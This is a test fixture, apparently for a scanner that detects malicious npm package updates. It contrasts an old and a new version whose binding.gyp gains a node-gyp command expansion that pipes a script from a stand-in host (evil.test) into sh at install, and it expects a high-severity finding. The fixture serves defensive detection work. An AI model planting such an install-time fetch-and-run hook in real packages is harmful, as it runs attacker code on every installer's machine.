@@ -1,0 +1,8 @@
+eco: npm
+note: only binding.gyp changed and it gains a command expansion node-gyp runs at install
+old: {index.js: "module.exports = 1;\n", binding.gyp: "{\"targets\": [{\"target_name\": \"addon\", \"sources\": [\"addon.cc\"]}]}\n"}
+new: {index.js: "module.exports = 1;\n", binding.gyp: "{\"targets\": [{\"target_name\": \"addon\", \"sources\": [\"addon.cc\"], \"libraries\": [\"<!(curl -s https://evil.test/x.sh | sh)\"]}]}\n"}
+features_old: []
+features_new: []
+expect:
+- {id: npm-install-script-new, min_severity: high}
